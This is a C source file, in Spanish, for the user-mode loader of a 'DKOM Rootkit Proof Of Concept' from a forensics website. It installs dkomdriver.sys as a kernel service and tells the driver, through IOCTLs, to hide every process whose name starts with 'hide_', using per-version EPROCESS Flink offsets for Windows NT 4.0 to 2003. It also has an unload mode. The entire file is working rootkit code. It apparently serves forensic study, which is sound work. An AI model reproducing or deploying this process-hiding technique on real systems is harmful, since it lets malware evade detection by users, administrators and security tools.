#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "interface.h"
#include "instdrv.h"

int flinkValue = 0;
int numProcess2Hide = 0;

VOID printUsage(char *programName);
DWORD getOsVersion(VOID);
BOOL removeDkomService(int verbose);
pProcessElement* getProcessList(char *prefixString);

int main(int argc, char **argv)
{
   int windowsVersion;
   pProcessElement *first, *current;
   proc2Hide p2h;
   char driverPath[MAX_PATH];
   SC_HANDLE scManager;
   SC_HANDLE scService;
   HANDLE hDevice;
   DWORD dwBytesRet;
   
   first = current = NULL;
    
   if(argc != 2)
   {
      printUsage(argv[0]);
      exit(1);
   }
   else
   {
      printf("\n");
      printf("\t---------------------------------\n\n");
      printf("\t- DKOM Rootkit Proof Of Concept -\n\n");
      printf("\t    http://neosysforensics.es\n\n");
      printf("\t---------------------------------\n\n");
   }
   
   if (strcmp((char *)argv[1], "on") == 0)
   {
      windowsVersion = getOsVersion();
      switch(windowsVersion)
      {
         case IS_WINDOWS_NT:
            
            printf("[OK] El sistema operativo identificado es MS Windows NT 4.0\n");
            break;
         
         case IS_WINDOWS_2000:
            
            printf("[OK] El sistema operativo identificado es MS Windows 2000\n");
            break;
            
         case IS_WINDOWS_XP:
              
            printf("[OK] El sistema operativo identificado es MS Windows XP\n");
            break;
         
         case IS_WINDOWS_2003:
              
            printf("[OK] El sistema operativo identificado es MS Windows 2003\n");
            break;
            
         case NOT_SUPPORTED:
		 
            printf("[ERROR] El sistema operativo no esta soportado\n");
            return FALSE;                     
      }

      GetSystemDirectory(driverPath, MAX_PATH);
	  strcat(driverPath, "\\drivers\\dkomdriver.sys");
	  CopyFile("dkomdriver.sys", driverPath, FALSE); 
	  
	  removeDkomService(VERBOSE_OFF);
	  
	  scManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
      if(!scManager)
      {
         printf("[ERROR] No se ha contactado con Service Control Manager\n");
         return FALSE;
      }
      printf("[OK] Abierta una conexion con Service Control Manager\n");
      
      scService = CreateService(scManager,
                                "dkomdriver",
                                "dkomdriver",
                                SERVICE_ALL_ACCESS,
                                SERVICE_KERNEL_DRIVER,
                                SERVICE_DEMAND_START,
                                SERVICE_ERROR_NORMAL,
                                driverPath,
                                NULL,
                                NULL,
                                NULL,
                                NULL,
                                NULL);
      if(!scService)
      {
         if(GetLastError() == ERROR_SERVICE_EXISTS)
         {
            scService = OpenService(scManager, "dkomdriver", SERVICE_ALL_ACCESS);
            if(!scService)
            {
               printf("[ERROR] No se ha podido crear el servicio 'dkomdriver'\n");
               CloseServiceHandle(scManager);
               return FALSE;
            }
         }
         else
         {
            printf("[ERROR] No se ha podido crear el servicio 'dkomdriver'\n");
            CloseServiceHandle(scManager);
            return FALSE;
         }
      }
      printf("[OK] Se ha creado correctamente el servicio 'dkomdriver'\n");
      
      if(!StartService(scService,0,NULL))
      {
         if(GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
         {
            printf("[ERROR] No se ha iniciado el servicio 'dkomdriver'\n");
            CloseServiceHandle(scManager);
            CloseServiceHandle(scService);
            return FALSE;
         }
      }
      printf("[OK] Se ha iniciado correctamente el servicio 'dkomdriver'\n");
	  
	  // Provoca la llamada a la MajorFunction dkomCreate
	  hDevice = CreateFile("\\\\.\\dkomdriver",
                           GENERIC_READ | GENERIC_WRITE,
                           0,
                           NULL,
                           OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);      
      if(hDevice == INVALID_HANDLE_VALUE)
      {
         printf("[ERROR] No ha podido obtenerse un manejador de control\n");
         return FALSE;
      }
      printf("[OK] Se ha obtenido correctamente el manejador de control\n");
      
      first = getProcessList("hide_");
      current = first;
      
      if(numProcess2Hide == 0)
         printf("[OK] No existen procesos que ocultar (con el prefijo hide_)\n");
      
      while(current != NULL)
      {
         p2h.iPid = current->iPid;
         p2h.iFlinkOffset = flinkValue; 
         
         if(!DeviceIoControl(hDevice,
                             (DWORD) IOCTL_DRV_HIDE,
                             (VOID *) &p2h,
                             sizeof(proc2Hide),
                             NULL,
                             0,
                             &dwBytesRet,
                             NULL))
         {
            printf("[ERROR] No ha podido enviarse codigo de control al driver\n");
            CloseHandle(hDevice);
            return FALSE;
         }      
        
         printf("[OK] Indicando a dkomdriver que oculte proceso con PID %d\n",p2h.iPid);        
         
         current = current->next;
         //Eliminamos elemento de la lista
         free(first);
         first = current;
         
         ZeroMemory(&p2h,sizeof(proc2Hide));        
      }
      
      // Provoca la llamada a la MajorFunction dkomClose
      CloseHandle(hDevice);

   }
   else if (strcmp((char *)argv[1], "off") == 0)
   {
      removeDkomService(VERBOSE_ON);
      GetSystemDirectory(driverPath, MAX_PATH);
	  strcat(driverPath, "\\drivers\\dkomdriver.sys");
	  
      if(!DeleteFile(driverPath))
         printf("[ERROR] No se ha podido eliminar el driver dkomdriver.sys\n");
      else
         printf("[OK] Se ha eliminado correctamente el driver dkomdriver.sys\n");

   }
   else
   {
      printUsage(argv[0]);
      return FALSE;
   }
         
   return TRUE;
}

VOID printUsage(char *programName)
{
   printf("\n");
   printf("\t---------------------------------\n\n");
   printf("\t- DKOM Rootkit Proof Of Concept -\n\n");
   printf("\t    http://neosysforensics.es\n\n");
   printf("\t---------------------------------\n\n");
   printf("\nPrograma que permite cargar/descargar el driver encargado de ocultar los\n");
   printf("procesos que comiencen con el prefijo 'hide_'.\n");
   printf("\nPara que la carga funcione correctamente el driver, dkomdriver.sys, debe\n");
   printf("estar ubicado en el directorio actual.\n\n\n");
   printf("Uso: %s [on|off]\n\n",programName); 
   printf("     on  Cargamos el driver\n");
   printf("     off Descargamos el driver\n\n");
   
   return;
}

DWORD getOsVersion(VOID)
{
   // Mas informacion sobre la estructura OSVERSIONINFOEX
   // http://msdn.microsoft.com/en-us/library/ms724833.aspx
   OSVERSIONINFOEX osvi;
     
   // Establecemos el tamaño de la estructura
   osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
     
   if(GetVersionEx((OSVERSIONINFO *) &osvi))
   {
      switch(osvi.dwPlatformId)
      {
         // Comprobamos la version de Windows NT
         case VER_PLATFORM_WIN32_NT:
         
            if(osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
            {
               flinkValue = 0x98;
               return IS_WINDOWS_NT;
            }
            else if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
            {
               flinkValue = 0xA0;
               return IS_WINDOWS_2000;
            }
            else if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
            {
               flinkValue = 0x88;
               return IS_WINDOWS_XP;
            }
            else if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)
            {
               flinkValue = 0x88;            
               return IS_WINDOWS_2003;
            }
            else
            {               
               return NOT_SUPPORTED;
            }
                        
            break;
      }
   }
}

BOOL removeDkomService(int verbose)
{
   SERVICE_STATUS ssService;
   SC_HANDLE      scManager;
   SC_HANDLE      scService;
   char driverPath[MAX_PATH];
   
   scManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
   if(scManager == NULL)
   {
      if(verbose) printf("[ERROR] No se ha contactado con Service Control Manager\n");
      return FALSE;
   }
   if(verbose) printf("[OK] Abierta una conexion con Service Control Manager\n");
   
   scService = OpenService(scManager, TEXT("dkomdriver"), SERVICE_ALL_ACCESS);
   if(!scService)
   { 
      if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
      {
         if(verbose) printf("[OK] No se detuvo el servicio 'dkomdriver' porque no existe\n"); 
         return FALSE;
      }
      else
      {
         if(verbose) printf("[ERROR] No se contactado con el servicio 'dkomdriver'\n"); 
         return FALSE;
      }
   }
   if(verbose) printf("[OK] Abierta una conexion con el servicio 'dkomdriver'\n");
   
   if(!ControlService(scService, SERVICE_CONTROL_STOP, &ssService))
   {
      if(GetLastError() != ERROR_SERVICE_NOT_ACTIVE)
      {
         if(verbose) printf("[ERROR] No se ha podido detener el servicio 'dkomdriver'\n");
         return FALSE;
      }
   }
   if(verbose) printf("[OK] Se ha detenido correctamente el servicio 'dkomdriver'\n");
   
   if(!DeleteService(scService))
   {
      if(verbose) printf("[ERROR] No ha podido eliminarse el servicio 'dkomdriver'\n"); 
      return FALSE;
   }
   if(verbose) printf("[OK] Se ha eliminado correctamente el servicio 'dkomdriver'\n");
   
   CloseServiceHandle(scService); 
   return TRUE;     
}

pProcessElement* getProcessList(char *prefixString)
{
   HWND hSnapshot;
   pProcessElement *first, *current, *last;
   first = current = last = NULL;
   
   hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   if(hSnapshot != INVALID_HANDLE_VALUE)
   {
      PROCESSENTRY32 pEntry = { sizeof(PROCESSENTRY32) };
      BOOL bOk = Process32First(hSnapshot, &pEntry);
        
      for (; bOk; bOk = Process32Next(hSnapshot, &pEntry))
      {
         if (strncmp(pEntry.szExeFile, prefixString, strlen(prefixString)) == 0)
         {
            numProcess2Hide++;
            current = (pProcessElement *) malloc(sizeof(pProcessElement));
            current->iPid  = pEntry.th32ProcessID;
            if(first == NULL)
               first = current;
            else
               last->next = current;
            
            current->next = NULL;
            last = current;
               
         }
      }
   }
   
   return first;    
}

